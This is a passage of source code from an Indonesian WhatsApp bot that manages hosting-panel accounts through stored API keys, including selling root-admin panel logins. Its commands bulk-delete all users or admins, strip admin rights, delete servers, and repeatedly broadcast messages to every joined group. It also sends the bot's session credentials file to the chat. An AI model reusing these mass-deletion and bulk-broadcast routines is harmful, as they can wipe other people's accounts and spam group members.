if (!NomerOwnBot) return m.reply(`Yang bisa Mengsetting Otomatis Hanya IzzWangsap😜`)
if (!text) return m.reply(`Nomor mana`)
global.owner = `${text}`
m.reply(`Berhasil Mengganti Bre`);
}
break
case 'senddomain': {
 

    if (!isOwner) return reply(`Hanya owner utama yang dapat menambahkan owner baru.`);
    
const userId = m.sender.split('@')[0]; // ID pengguna (nomor telepon)

const argsSplit = q.split(",");
    const username = argsSplit[0]?.trim(); // Nama admin baru
    const quotedOrTagged = m.mentionedJid?.[0] || m.quoted?.sender; // ID dari reply/tag
    const nomor = quotedOrTagged 
        ? quotedOrTagged.split('@')[0] 
        : argsSplit[0]?.replace(/[^0-9]/g, '') || userId; 

    reply(`sedang mengirim`);
    
    const userId3 = `${nomor}@s.whatsapp.net`;
  
      await Izz.sendMessage(userId3, {
        text:`
═════════════════════════
𝗕𝗘𝗥𝗜𝗞𝗨𝗧 𝗟𝗜𝗡𝗞 𝗗𝗢𝗠𝗔𝗜𝗡 𝗔𝗡𝗗𝗔 🗿
𝗗𝗢𝗠𝗔𝗜𝗡 = ${domain}
𝗗𝗜𝗞𝗜𝗥𝗜𝗠 𝗞𝗘 = ${nomor}
﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌`,
    });
    
    reply(`sukses mengirim`);
    
    }
    break
case "cadmin": {
    const allowedPath = './save/database/allowed.json';

    // Cek apakah file allowed.json ada
    if (!fs.existsSync(allowedPath)) {
        reply(`Database pengguna (allowed.json) tidak ditemukan.`);
        return;
    }

    // Load isi database
    const allowed = JSON.parse(fs.readFileSync(allowedPath));

    // Ambil ID pengguna
    const userId = m.sender.split('@')[0]; // ID pengguna (nomor telepon)

    // Periksa apakah ID pengguna ada di database
    if (!allowed.includes(userId)) {
        reply(`Anda tidak termasuk ke database. Silakan beli ke owner.`);
        return;
    }

    // Pastikan hanya owner atau asisten yang bisa menjalankan
    if (!isOwner && !isAsisten) {
        reply(`Perintah ini hanya untuk owner atau asisten.`);
        return;
    }

    // Ambil argumen dari input
    const argsSplit = q.split(",");
    const username = argsSplit[0]?.trim(); // Nama admin baru
    const quotedOrTagged = m.mentionedJid?.[0] || m.quoted?.sender; // Nomor dari mention atau balasan
    let nomor = quotedOrTagged ? quotedOrTagged.split('@')[0] : null; // Default ke nomor dari reply/tag jika ada
    let serverChoice = argsSplit[2]?.trim().toLowerCase(); // ID server diambil dari argumen ketiga

    // Validasi nomor
    if (!nomor) {
        if (argsSplit.length >= 2 && /^\d{4,}$/.test(argsSplit[1])) {
            nomor = argsSplit[1].trim(); // Nomor diambil dari argumen kedua
        } else {
            nomor = m.sender.split('@')[0]; // Jika tidak ada, default ke nomor pengirim
        }
    }

    // Validasi input serverChoice
    if (!serverChoice && argsSplit.length >= 2) {
        serverChoice = argsSplit[1].trim().toLowerCase(); // Jika hanya ada dua argumen, serverChoice diambil dari argumen kedua
    }

    if (!username || !serverChoice) {
        reply(`Format salah! Gunakan format:\n1. Balas pesan dengan .cadmin username,id_server\n2. Ketik .cadmin username,@orang,id_server`);
        return;
    }

    // Tentukan domain dan apikey berdasarkan ID server
    let serverConfig;
    if (["1", "satu"].includes(serverChoice)) {
        if (!isOwner && !isAsisten) return m.reply(`Only owner dan asisten untuk ID server 1`);
        serverConfig = { domain: global.domain, apikey: global.apikey };
    } else if (["2", "dua"].includes(serverChoice)) {
        if (!isOwner) return m.reply(`Only owner untuk ID server 2`);
        serverConfig = { domain: global.domain2, apikey: global.apikey2 };
    } else if (["3", "prib"].includes(serverChoice)) {
        if (!isOwner) return m.reply(`Only owner untuk ID server prib`);
        serverConfig = { domain: global.domain3, apikey: global.apikey3 };
    } else {
        reply(`Server tidak valid. Gunakan '1', '2', atau 'prib'.`);
        return;
    }

    const { domain, apikey } = serverConfig;
    const userIdAdmin = `${nomor}@s.whatsapp.net`; // Format nomor untuk ID WhatsApp
    const password = generateRandomPassword(6); // Fungsi untuk membuat password acak

    console.log("Input username:", username);
    console.log("Nomor tujuan:", nomor);
    console.log("Server ID:", serverChoice);

    try {
        // Buat akun admin di sistem
        const response = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                email: `${username}@gmail.com`,
                username: username,
                first_name: username,
                last_name: "Admin",
                language: "en",
                root_admin: true,
                password: password,
            }),
        });

        const data = await response.json();

        // Jika ada error dari server
        if (data.errors) {
            reply(`Gagal membuat admin. Detail error:\n${JSON.stringify(data.errors[0], null, 2)}`);
            return;
        }

        const user = data.attributes;

const gifPath = './gif.mp4';
if (fs.existsSync(gifPath)) {
    await Izz.sendMessage(userIdAdmin, {
        video: fs.readFileSync(gifPath),
        caption: `┏𓊈𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 𝗠𝗘𝗠𝗕𝗨𝗔𝗧 𝗔𝗗𝗣📋𓊉┓
┃𝗗𝗔𝗧𝗔 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔👇
┗━━━━━━━━━━━━
┏╍╍╍╍╍╍╍╍╍╍╍╍╍╍
╏𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 = *${username}*
╏𝗜𝗗 𝗨𝗦𝗘𝗥 = *${user.id}*
╏𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 = *${password}*
╏𝗗𝗢𝗠𝗔𝗜𝗡 = *${domain}*
╏𝗗𝗜𝗕𝗨𝗔𝗧 𝗗𝗜 𝗦𝗥𝗩 = *${serverChoice}*
╏𝗣𝗔𝗗𝗔 𝗝𝗔𝗠 = *${wib}*
┗╍╍╍╍╍╍╍╍╍╍╍╍╍╍

┏━⟬𝗥𝗨𝗟𝗘𝗦 📃⟭
┃•𝗡𝗢 𝗥𝗨𝗦𝗨𝗛 𝗦𝗘𝗥𝗩𝗘𝗥 𝗢𝗥𝗡𝗚
┃•𝗝𝗔𝗡 𝗗𝗘𝗟 𝗔𝗗𝗣 𝗦𝗘𝗠𝗕𝗔𝗥𝗔𝗡𝗚𝗔𝗡
┃•𝗗𝗔𝗧𝗔 𝗔𝗗𝗣 𝗛𝗔𝗡𝗬𝗔 𝗗𝗜𝗞𝗜𝗥𝗜𝗠 𝗦𝗘𝗞𝗔𝗟𝗜
┃•𝗡𝗢 𝗥𝗘𝗙𝗙 𝗡𝗢 𝗥𝗘𝗖
┗━━━━━━━━━━━━━━`,
gifPlayback: true
    });
} else {
    reply("File GIF tidak ditemukan.");
}

        // Pesan konfirmasi ke pengirim
        reply(`┏⧼ 𝗗𝗔𝗧𝗔 𝗔𝗗𝗣 𝗔𝗡𝗗𝗔 𝗧𝗘𝗟𝗔𝗛 𝗗𝗜𝗞𝗜𝗥𝗠 ⧽
┗━━━━━━━━━━━━━━━━━━━━━━

┏𝗡𝗢𝗧𝗘
┃•𝗛𝗔𝗥𝗔𝗣 𝗦𝗜𝗠𝗣𝗔𝗡 𝗕𝗔𝗜𝗞 𝗕𝗔𝗜𝗞 𝗞𝗔𝗥𝗘𝗡𝗔\n┃𝗞𝗔𝗠𝗜 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠𝗞𝗔𝗡 𝗦𝗘𝗞𝗔𝗟𝗜
┗━━━━━━━━━━━━━━━━━━━━
𝗕𝗨𝗬 𝗦𝗖 𝗣𝗠 = *wa.me//6281274749995*`);
    } catch (error) {
        reply("Terjadi kesalahan saat membuat akun admin. Silakan coba lagi.");
        console.error(error);
    }
}
break

case 'listowner': 
case 'listcreator': {
const allowedPath = './save/database/allowed.json';

    // Cek apakah file allowed.json ada
    if (!fs.existsSync(allowedPath)) {
        reply(`Database pengguna (allowed.json) tidak ditemukan.`);
        return;
    }

    // Load isi database
    const allowed = JSON.parse(fs.readFileSync(allowedPath));

    // Ambil ID pengguna
    const userId = m.sender.split('@')[0]; // ID pengguna (nomor telepon)

    // Periksa apakah ID pengguna ada di database
    if (!allowed.includes(userId)) {
        reply(`anda tidak termasuk ke database silahkan beli ke owner`);
        return;
    }
if (!isOwner) return reply('ONLY OWNER BRE') 
teks = `List owner\nTotal: ${own.length}\n\n`
for (let kon of own) {
teks += `• ${kon}\n`
}
m.reply(teks)
}
break

case 'listasisten': 
case 'listowner2': {
const allowedPath = './save/database/allowed.json';

    // Cek apakah file allowed.json ada
    if (!fs.existsSync(allowedPath)) {
        reply(`Database pengguna (allowed.json) tidak ditemukan.`);
        return;
    }

    // Load isi database
    const allowed = JSON.parse(fs.readFileSync(allowedPath));

    // Ambil ID pengguna
    const userId = m.sender.split('@')[0]; // ID pengguna (nomor telepon)

    // Periksa apakah ID pengguna ada di database
    if (!allowed.includes(userId)) {
        reply(`anda tidak termasuk ke database silahkan beli ke owner`);
        return;
    }
if (!isOwner) return reply('ONLY OWNER BRE') 
teks = `List owner\nTotal: ${asis.length}\n\n`
for (let kon of asis) {
teks += `• ${kon}\n`
}
m.reply(teks)
}
break
case 'gpt': {
if (!isOwner) return m.reply(`khusus Owner izz`);
const GptNumber = '18002428478@s.whatsapp.net';
if (!text) {
return reply("Silakan masukkan pesan yang ingin dikirim.");
}
await Izz.sendMessage(GptNumber, {
text: text
});
if (global.responseListener) {
Izz.ev.off('messages.upsert', global.responseListener);
}
global.responseListener = async (msg) => {
if (
msg.messages[0].key.remoteJid === GptNumber && 
msg.messages[0].message?.conversation
) {
const response = msg.messages[0].message.conversation;
await Izz.sendMessage(m.chat, {
text: `${response}`
});
}
};
Izz.ev.on('messages.upsert', global.responseListener);
}
break
    case 'creategc': case 'creategroup': {
if (!isOwner) return m.reply(mess.owner);
if (!args.join(" ")) return m.reply(`Use ${prefix+command} groupname`)
try {
let cret = await Izz.groupCreate(args.join(" "), [])
let response = await Izz.groupInviteCode(cret.id)
const teksop = `     「 Succes Create Group 」
Link Group 👇
https://chat.whatsapp.com/${response}`
Izz.sendMessage(m.chat, { text:teksop, mentions: await Izz.parseMention(teksop)}, {quoted:m})
} catch {
	m.reply(`Error`)
	}
}
break
case 'pin': {
if (!isOwner) return m.reply(`khusus owner`);
  if (!text) return m.reply('Masukkan prompt pencarian gambar, contoh: #pinterest nature');
  
  const prompt = text;
  
  try {
    const imageUrl = await cimg(prompt);
    
    if (imageUrl) {
      // Mengirim gambar yang dihasilkan oleh cimg ke pengguna
      await Izz.sendMessage(m.chat, { image: { url: imageUrl }, caption: `*Hasil pencarian untuk:* ${prompt}` }, m);
    } else {
      await Izz.sendMessage(m.chat, { text: 'Gagal mendapatkan gambar. Coba lagi nanti.' }, m);
    }
  } catch (error) {
    console.error('Error mencari gambar Pinterest:', error);
    await Izz.sendMessage(m.chat, { text: 'Terjadi kesalahan saat mencari gambar. Coba lagi nanti.' }, m);
  }
}
break
case 'hdimg': {
if (!isOwner) return m.reply(`only izz`) 
if (!/image/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
await Izz.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
const { remini } = require('./lib/general/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance");
Izz.sendMessage(m.chat, { image: proses, caption: 'Sukses'}, { quoted: m})
}
break
case 'clearuser': {
if (!isOwner) return m.reply(`Only Owner`);
    
    if (!text) return m.reply(`*Format salah*\nPenggunaan: ${prefix + command} idadmin`);
    

    // Ambil ID admin yang harus dikecualikan dan domain panel
    let idadmin = Number(text);
    let domainpnl = `${domain}`;
    let tokenptla = `${apikey}`;

    reply('Proses penghapusan semua pengguna dimulai.');

    // Fungsi untuk menghapus semua pengguna kecuali admin tertentu
    async function deleteAllUsers() {
    let currentPage = 1;
    let totalPages;

    do {
      let response = await fetch(`${domainpnl}/api/application/users?page=${currentPage}`, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${tokenptla}`
        }
      });

      if (!response.ok) {
        reply(`Gagal mendapatkan data pengguna: ${response.statusText}`);
        console.log(await response.text());
        return;
      }

      let result = await response.json();

      // Memastikan data pagination ada
      if (result.meta && result.meta.pagination) {
        totalPages = result.meta.pagination.total_pages;
      } else {
        reply(`Gagal mendapatkan data pagination.`);
        return;
      }

      for (let user of result.data) {
        let userId = user.attributes.id;
        
        if (userId === idadmin) {
          console.log(`Melewatkan server dengan ID ${userId}`);
          continue; 
          reply(`MELEWATKAN ID ${idadmin} `);
          // Lanjutkan ke iterasi berikutnya
        }

        let deleteResponse = await fetch(`${domainpnl}/api/application/users/${userId}`, {
          method: 'DELETE',
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${tokenptla}`
          }
        });

        if (!deleteResponse.ok) {
          let errorResult = await deleteResponse.json();
          reply(`Gagal menghapus user dengan ID ${userId}: ${errorResult.errors}`);
        } else {
          console.log(`Berhasil menghapus user dengan ID ${userId}`);
        }
      }

      currentPage++;
    } while (currentPage <= totalPages);
  }


    // Memanggil fungsi penghapusan pengguna
    await deleteAllUsers();
    reply('Proses penghapusan semua pengguna selesai.');
}
break
case 'clearalladmin': {
    if (!isOwner) return m.reply(`Hanya pemilik yang dapat menggunakan perintah ini.`);
    if (!args[0]) return m.reply(`*Format salah*\nPenggunaan: ${prefix + command} <idadmin yang dikecualikan>`);

    let excludedId = Number(args[0]); // ID admin yang dikecualikan
    let domainpnl = `${domain}`;
    let tokenptla = `${apikey}`;

    m.reply('Proses penghapusan semua admin dimulai, mohon tunggu...');

    // Fungsi untuk menghapus semua admin kecuali ID tertentu
    async function deleteAllAdmins() {
        let currentPage = 1;
        let totalPages;
        let jumlahAdminDihapus = 0; // Counter untuk admin yang berhasil dihapus

        do {
            let response = await fetch(`${domainpnl}/api/application/users?page=${currentPage}`, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${tokenptla}`
                }
            });

            if (!response.ok) {
                m.reply(`Gagal mendapatkan data pengguna: ${response.statusText}`);
                console.log(await response.text());
                return;
            }

            let result = await response.json();

            // Memastikan data pagination ada
            if (result.meta && result.meta.pagination) {
                totalPages = result.meta.pagination.total_pages;
            } else {
                m.reply(`Gagal mendapatkan data pagination.`);
                return;
            }

            for (let user of result.data) {
                let userId = user.attributes.id; // ID pengguna
                let username = user.attributes.username; // Nama pengguna
                let isAdmin = user.attributes.root_admin; // Status admin

                if (userId === excludedId) {
                    console.log(`Melewatkan admin dengan ID ${userId} (${username}).`);
                    m.reply(`Melewatkan admin dengan ID ${excludedId}.`);
                    continue; // Lewati admin yang dikecualikan
                }

                if (isAdmin) { // Hanya admin yang dihapus
                    let deleteResponse = await fetch(`${domainpnl}/api/application/users/${userId}`, {
                        method: 'DELETE',
                        headers: {
                            'Accept': 'application/json',
                            'Content-Type': 'application/json',
                            'Authorization': `Bearer ${tokenptla}`
                        }
                    });

                    if (!deleteResponse.ok) {
                        let errorResult = await deleteResponse.json();
                        m.reply(`Gagal menghapus admin ${username} (ID: ${userId}): ${errorResult.errors}`);
                    } else {
                        jumlahAdminDihapus++;
                        console.log(`Berhasil menghapus admin ${username} (ID: ${userId}).`);
                        m.reply(`Berhasil menghapus admin: *${username}* (ID: ${userId}).`);
                    }
                }
            }

            currentPage++;
        } while (currentPage <= totalPages);

        if (jumlahAdminDihapus === 0) {
            m.reply("Tidak ada admin yang ditemukan untuk dihapus.");
        } else {
            m.reply(`Proses selesai! Berhasil menghapus ${jumlahAdminDihapus} admin, kecuali admin dengan ID ${excludedId}.`);
        }
    }

    // Memanggil fungsi penghapusan admin
    await deleteAllAdmins();
    m.reply('Proses penghapusan semua admin selesai.');
}
break
case 'stopadmin': {
if (!isOwner) return m.reply(mess.owner);
    if (!args[0]) return m.reply(`*Format salah*\nPenggunaan: ${prefix}stopadmin <ID Admin>`);

    let cek = await fetch(domain + "/api/application/users?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });

    let res2 = await cek.json();
    let users = res2.data;
    let targetUsername = null;
    let targetId = null;
    let targetEmail = null;
    let targetFirstName = null;
    let targetLastName = null;

    // Iterasi untuk mencari admin berdasarkan ID
    await Promise.all(users.map(async (e) => {
        if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
            targetUsername = e.attributes.username;
            targetId = e.attributes.id;
            targetEmail = e.attributes.email;
            targetFirstName = e.attributes.first_name;
            targetLastName = e.attributes.last_name;

            // Mengubah root_admin menjadi false dengan data lengkap pengguna
            let updateAdmin = await fetch(domain + `/api/application/users/${targetId}`, {
                "method": "PATCH",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                },
                "body": JSON.stringify({
                    username: targetUsername,
                    email: targetEmail,
                    first_name: targetFirstName,
                    last_name: targetLastName,
                    root_admin: false // Ubah status admin
                })
            });

            if (updateAdmin.ok) {
                m.reply(`Berhasil menghentikan hak admin: *${targetUsername}*`);
            } else {
                let errorResponse = await updateAdmin.json();
                let errorDetails = errorResponse.errors
                    ? errorResponse.errors.map(err => `${err.detail}`).join(", ")
                    : "Terjadi kesalahan yang tidak diketahui.";
                m.reply(`Gagal menghentikan hak admin *${targetUsername}*: ${errorDetails}`);
            }
        }
    }));

    if (targetId == null) return m.reply("ID admin tidak ditemukan atau pengguna tersebut bukan admin!");
}
break
case 'stopalladmin': {
if (!isOwner) return m.reply(mess.owner);
    if (!args[0]) return m.reply(`*Format salah*\nPenggunaan: ${prefix}stopalladmin <ID yang dikecualikan>`);

    let excludedAdminId = Number(args[0]); // ID admin yang dikecualikan
    let currentPage = 1;
    let totalPages;

    reply('Proses penghentian hak admin dimulai.');

    // Fungsi untuk menghentikan hak admin
    async function stopAllAdmins() {
        do {
            // Ambil daftar pengguna pada halaman tertentu
            let response = await fetch(`${domain}/api/application/users?page=${currentPage}`, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${apikey}`
                }
            });

            if (!response.ok) {
                reply(`Gagal mendapatkan data pengguna: ${response.statusText}`);
                console.log(await response.text());
                return;
            }

            let result = await response.json();

            // Pastikan pagination tersedia
            if (result.meta && result.meta.pagination) {
                totalPages = result.meta.pagination.total_pages;
            } else {
                reply(`Gagal mendapatkan data pagination.`);
                return;
            }

            // Iterasi setiap pengguna
            for (let user of result.data) {
                let userId = user.attributes.id;
                let username = user.attributes.username;
                let email = user.attributes.email;
                let firstName = user.attributes.first_name;
                let lastName = user.attributes.last_name;
                let isAdmin = user.attributes.root_admin;

                // Lewati jika ID sama dengan yang dikecualikan atau bukan admin
                if (userId === excludedAdminId) {
                    console.log(`Melewatkan admin dengan ID ${userId}`);
                    reply(`Melewatkan admin dengan ID ${excludedAdminId}`);
                    continue;
                }

                if (!isAdmin) continue; // Lewati jika pengguna bukan admin

                // Lakukan PATCH untuk menghentikan hak admin
                let updateAdmin = await fetch(`${domain}/api/application/users/${userId}`, {
                    method: 'PATCH',
                    headers: {
                        'Accept': 'application/json',
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${apikey}`
                    },
                    body: JSON.stringify({
                        username: username || "", // Jika username null, kirim string kosong
                        email: email || "",       // Jika email null, kirim string kosong
                        first_name: firstName || "",
                        last_name: lastName || "",
                        root_admin: false         // Ubah status admin
                    })
                });

                if (updateAdmin.ok) {
                    console.log(`Berhasil menghentikan hak admin: ${username}`);
                    reply(`Berhasil menghentikan hak admin: *${username}*`);
                } else {
                    let errorResult = await updateAdmin.json();
                    let errorDetails = errorResult.errors
                        ? errorResult.errors.map(err => `${err.detail}`).join(", ")
                        : "Terjadi kesalahan yang tidak diketahui.";
                    console.log(`Gagal menghentikan hak admin ${username}: ${errorDetails}`);
                    reply(`Gagal menghentikan hak admin *${username}*: ${errorDetails}`);
                }
            }

            currentPage++;
        } while (currentPage <= totalPages);
    }

    // Jalankan proses
    await stopAllAdmins();
    reply('Proses penghentian semua hak admin selesai.');
}
break
            case 'delsession':
            case 'clearsession': {
                if (!isOwner) return m.reply(mess.owner);
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return m.reply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return m.reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    m.reply(teks)
                    await sleep(2000)
                    m.reply("Deleting junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    m.reply("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join': {
                try {
                 if (!isOwner) return m.reply(mess.owner);
                    if (!text) return m.reply('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply('Link Invalid!')
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    Izz.groupAcceptInvite(result)
                    await m.reply(`Done`)
                } catch {
                    m.reply('Failed to join the Group')
                }
                }
                break
            case 'getsession': {
             if (!isOwner) return m.reply(mess.owner);
                m.reply('Wait a moment, currently retrieving your session file')
                let sesi = fs.readFileSync('./session/creds.json')
                Izz.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                }
                break
                case 'restartbot':{
                if (!isOwner) return m.reply(mess.owner);
                reply("Bot akan direstart. Mohon tunggu...");
    console.log("Bot sedang direstart oleh:", m.sender);

    // Tunggu 1 detik sebelum keluar
    setTimeout(() => {
        process.exit(0); // Berhenti dengan kode sukses
    }, 1000);

}
break
case 'boom': {
m.reply(`Memulai Fitur`);
await sleep(1000)
Izz.sendMessage(m.chat, { react: { text: `🎉`, key: m.key }});
await sleep(3000)
Izz.sendMessage(m.chat, { react: { text: `🎉`, key: m.key }});
await sleep(3000)
Izz.sendMessage(m.chat, { react: { text: `🎉`, key: m.key }});
await sleep(3000)
Izz.sendMessage(m.chat, { react: { text: `🎉`, key: m.key }});
await sleep(3000)
Izz.sendMessage(m.chat, { react: { text: `🎉`, key: m.key }});
await sleep(3000)
Izz.sendMessage(m.chat, { react: { text: `🎉`, key: m.key }});
await sleep(3000)
Izz.sendMessage(m.chat, { react: { text: `🎉`, key: m.key }});
await sleep(3000)
Izz.sendMessage(m.chat, { react: { text: `🎉`, key: m.key }});
await sleep(3000)
Izz.sendMessage(m.chat, { react: { text: `🎉`, key: m.key }});
await sleep(3000)
Izz.sendMessage(m.chat, { react: { text: `🎉`, key: m.key }});
await sleep(3000)
Izz.sendMessage(m.chat, { react: { text: `🎉`, key: m.key }});
await sleep(1000)
m.reply(`Done`);
}
break
case 'jpmputar': {
    const allowedPath = './save/database/allowed.json';

    // Cek apakah file allowed.json ada
    if (!fs.existsSync(allowedPath)) {
        reply(`Database pengguna (allowed.json) tidak ditemukan.`);
        return;
    }

    // Load isi database
    const allowed = JSON.parse(fs.readFileSync(allowedPath));

    // Ambil ID pengguna
    const userId = m.sender.split('@')[0]; // ID pengguna (nomor telepon)

    // Periksa apakah ID pengguna ada di database
    if (!allowed.includes(userId)) {
        reply(`Anda tidak termasuk ke database, silakan beli ke owner.`);
        return;
    }

    if (!isOwner) return reply(`Only izzOwner`);
    if (!text) {
        return reply(
            `*Incorrect Usage*\nGunakan seperti ini:\n${prefix + command} text|delay|delayputaran|jumlahputaran\n\nContoh:\n${prefix + command} Halo semua|2000|5000|3\n` +
            `Keterangan:\n- *text*: Pesan yang akan dikirim\n- *delay*: Delay antar pengiriman pesan dalam milidetik (contoh: 2000 = 2 detik)\n` +
            `- *delayputaran*: Delay antar putaran dalam milidetik (contoh: 5000 = 5 detik)\n- *jumlahputaran*: Jumlah total putaran pengiriman pesan`
        );
    }

    // Split input
    const args = text.split('|');
    if (args.length < 4) {
        return reply(`Input tidak lengkap. Gunakan format: text|delay|delayputaran|jumlahputaran`);
    }

    const message = args[0]; // Pesan yang dikirim
    const delay = parseInt(args[1]); // Delay antar pesan
    const delayPutaran = parseInt(args[2]); // Delay antar putaran
    const jumlahPutaran = parseInt(args[3]); // Jumlah putaran

    if (isNaN(delay) || isNaN(delayPutaran) || isNaN(jumlahPutaran)) {
        return reply(`Delay dan jumlah putaran harus berupa angka.`);
    }

    await reply(`Pengiriman pesan akan dimulai. Total putaran: ${jumlahPutaran}`);

    // Mengambil semua grup yang diikuti bot
    let getGroups = await Izz.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
    let anu = groups.map((v) => v.id);

    for (let putaran = 1; putaran <= jumlahPutaran; putaran++) {
        for (let xnxx of anu) {
            await Izz.sendMessage(xnxx, { text: message }); // Kirim pesan teks
            await sleep(delay); // Tunggu sesuai delay antar pesan
        }

        // Beri informasi setelah setiap putaran selesai
        await reply(`Putaran ke-${putaran} selesai.`);

        // Tunggu sebelum memulai putaran berikutnya
        if (putaran < jumlahPutaran) {
            await reply(`Menunggu ${delayPutaran / 1000} detik sebelum memulai putaran berikutnya.`);
            await sleep(delayPutaran);
        }
    }

    reply(`Pengiriman selesai. Total putaran: ${jumlahPutaran}`);
   
}
break
        case "delpanel": {
        const allowedPath = './save/database/allowed.json';

    // Cek apakah file allowed.json ada
    if (!fs.existsSync(allowedPath)) {
        reply(`Database pengguna (allowed.json) tidak ditemukan.`);
        return;
    }

    // Load isi database
    const allowed = JSON.parse(fs.readFileSync(allowedPath));

    // Ambil ID pengguna
    const userId = m.sender.split('@')[0]; // ID pengguna (nomor telepon)

    // Periksa apakah ID pengguna ada di database
    if (!allowed.includes(userId)) {
        reply(`anda tidak termasuk ke database silahkan beli ke owner`);
        return;
    }
      if (!isOwner) return reply(`khusus owner `)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break
case 'autopromosi': {
        if (!isOwner) return m.reply("Fitur ini hanya dapat diakses oleh owner.");
        if (!text) return m.reply("Gunakan perintah seperti ini:\n.autopromosi on\n.autopromosi off");

        if (text.toLowerCase() === "on") {
            global.autoPromosiActive = true;
            m.reply("Fitur Auto Promosi telah diaktifkan.");
        } else if (text.toLowerCase() === "off") {
            global.autoPromosiActive = false;
            m.reply("Fitur Auto Promosi telah dinonaktifkan.");
        } else {
            m.reply("Perintah tidak valid. Gunakan:\n.autopromosi on\n.autopromosi off");
        }
      
    }
    break
    case 'listadminall': {
    if (!isOwner) return m.reply(mess.owner);

    let page = args[0] ? args[0] : '1';
    let messageText = "👑 Berikut List Admin dari Tiga Server:\n\n";

    // Konfigurasi untuk setiap server
    const serverConfigs = [
        { domain: global.domain, apikey: global.apikey, capikey: global.capikey, label: "Server 1" },
        { domain: global.domain2, apikey: global.apikey2, capikey: global.capikey2, label: "Server 2" },
        { domain: global.domain3, apikey: global.apikey3, capikey: global.capikey3, label: "Server 3" }
    ];

    // Loop melalui setiap konfigurasi server
    for (const config of serverConfigs) {
        try {
            // Tambahkan header untuk setiap server
            messageText += `🖥️ ${config.label}:\n\n`;

            // Fetch data dari server
            let f = await fetch(`${config.domain}/api/application/users?page=${page}`, {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${config.apikey}`
                }
            });
            let res = await f.json();
            let users = res.data || [];

            // Cek jika tidak ada admin di halaman tersebut
            if (users.length === 0) {
                messageText += `Tidak ada admin di halaman ${page} pada ${config.label}\n\n`;
            } else {
                for (let user of users) {
                    let u = user.attributes;
                    if (u.root_admin) {
                        let status = u.user?.server_limit === null ? 'Inactive' : 'Active';
                        messageText += `🆔𝑰𝑫: ${u.id} - Status: ${status}\n`;
                        messageText += `㊗️𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: ${u.username}\n`;
                        messageText += `🈵𝐅𝐢𝐫𝐬𝐭𝐧𝐚𝐦𝐞: ${u.first_name}\n`;
                        messageText += `👾𝐋𝐚𝐬𝐭𝐧𝐚𝐦𝐞: ${u.last_name}\n\n`;
                         
                    }
                }
            }

            // Informasi pagination
            messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
            messageText += `Total: ${res.meta.pagination.count}\n\n`;

        } catch (error) {
            messageText += `❗ Terjadi kesalahan saat mengakses ${config.label}. Cek konfigurasi atau API.\n\n`;
            console.error(`Error pada ${config.label}:`, error);
        }
    }

    // Kirim pesan hasil akhir
    await Izz.sendMessage(m.chat, { text: messageText }, { quoted: m });

    // Pagination: Jika ada halaman berikutnya di Server 1, tampilkan pesan untuk melihat halaman selanjutnya
    let res = await fetch(`${global.domain}/api/application/users?page=${page}`, {
        method: "GET",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": `Bearer ${global.apikey}`
        }
    });
    let dataRes = await res.json();
    if (dataRes.meta.pagination.current_page < dataRes.meta.pagination.total_pages) {
        m.reply(`Contoh: ${prefix + command} ${parseInt(page) + 1} untuk melihat halaman selanjutnya`);
    }
}
break
case 'stopadminall': {
    if (!isOwner) return m.reply(mess.owner); // Hanya owner yang dapat menjalankan perintah
